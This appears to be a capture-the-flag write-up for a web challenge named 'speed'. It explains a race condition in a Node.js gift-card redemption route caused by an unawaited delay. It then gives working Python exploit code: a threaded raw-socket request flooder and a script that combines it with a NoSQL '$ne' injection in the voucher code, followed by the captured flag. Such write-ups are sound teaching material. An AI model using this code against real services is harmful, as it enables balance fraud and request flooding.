---
created: 2025-01-19T01:45
updated: 2025-01-19T13:32
points: 50
solves: 189
---

`lastVoucherRedemption` is checked only at the start, and updated at the end, creating a window for race condition.

```js
const lastRedemption = user.lastVoucherRedemption;
if (lastRedemption) {
    const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &&
                        lastRedemption.getMonth() === today.getMonth() &&
                        lastRedemption.getDate() === today.getDate();
    if (isSameDay) {
        return res.json({success: false, message: 'You have already redeemed your gift card today!' });
    }
}

// Apply the gift card value to the user's balance
const { Balance } = await User.findById(req.user.userId).select('Balance');
user.Balance = Balance + discount.value;
// Introduce a slight delay to ensure proper logging of the transaction 
// and prevent potential database write collisions in high-load scenarios.
new Promise(resolve => setTimeout(resolve, delay * 1000));
user.lastVoucherRedemption = today;
await user.save();
```

The delay would be helpful if it was actually awaited.

```python [raw_http]
import socket
import threading
import time


def create_raw_request(host, path, jwt_cookie, method="GET"):
    request = f"{method} {path} HTTP/1.1\r\n"
    request += f"Host: {host}\r\n"
    request += f"Cookie: jwt={jwt_cookie}\r\n"
    request += "Connection: keep-alive\r\n"
    request += "\r\n"
    return request.encode()


def receive_response(sock):
    response = b""
    sock.settimeout(2)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    return response.decode('utf-8', errors='ignore')


def send_raw(host, port, request_data, sock=None):
    try:
        if not sock:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
        sock.send(request_data)
        return sock
    except Exception as e:
        if sock:
            sock.close()
        return None


def spam_raw(host, port, path, jwt_cookie, num_requests=1000, num_threads=100):
    request_data = create_raw_request(host, path, jwt_cookie)
    response_content = None

    def worker():
        nonlocal response_content
        sock = None
        for i in range(num_requests // num_threads):
            try:
                sock = send_raw(host, port, request_data, sock)
                if not sock:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))

                # Get response content from the last request in the first thread
                if i == (num_requests // num_threads - 1) and threading.current_thread().name == "Thread-0":
                    response_content = receive_response(sock)
            except:
                if sock:
                    sock.close()
                sock = None

    start = time.time()
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, name=f"Thread-{i}")
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    end = time.time()
    print(f"Sent {num_requests} requests in {end-start:.2f} seconds")
    print(f"Requests per second: {num_requests/(end-start):.2f}")

    if response_content:
        print("\nResponse from last request:")
        print(response_content)
```

```python
import random

import requests
from raw_http import spam_raw
target = "http://speed.challs.srdnlen.it:8082"

username = "kumo"+str(random.randint(0, 1000000))
password = "kumo"
s = requests.session()
r = s.post(f"{target}/register-user", json={
    'username': username,
    'password': password
})
jwt = s.cookies.get("jwt")
HOST = "speed.challs.srdnlen.it"
PORT = 8082
PATH = "/redeem?discountCode[$ne]%3d"
spam_raw(
    host=HOST,
    port=PORT,
    path=PATH,
    jwt_cookie=jwt,
    num_requests=1000,
    num_threads=32
)

print(s.post(f"{target}/store", json={"productId": 4}).json())
```

```flag
srdnlen{6peed_1s_My_0nly_Competition}
```
